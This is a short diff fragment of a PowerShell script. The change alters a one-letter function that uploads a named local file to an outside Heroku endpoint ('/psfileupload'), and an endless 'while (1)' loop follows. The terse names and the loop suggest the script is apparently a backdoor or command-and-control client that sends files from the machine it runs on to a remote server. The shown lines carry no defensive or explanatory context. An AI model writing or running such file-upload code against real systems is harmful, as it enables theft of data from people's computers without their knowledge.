@@ -49,7 +49,7 @@ function S {
 
 function U {
 param($String)
-(New-Object System.Net.WebClient).UploadFile("http://y44v5ltr.herokuapp.com/psfileupload",".\" + $String)
+(New-Object System.Net.WebClient).UploadFile("http://y44v5ltr.herokuapp.com/psfileupload",(Resolve-Path ".\" + $String))
 }
 
 while (1) 
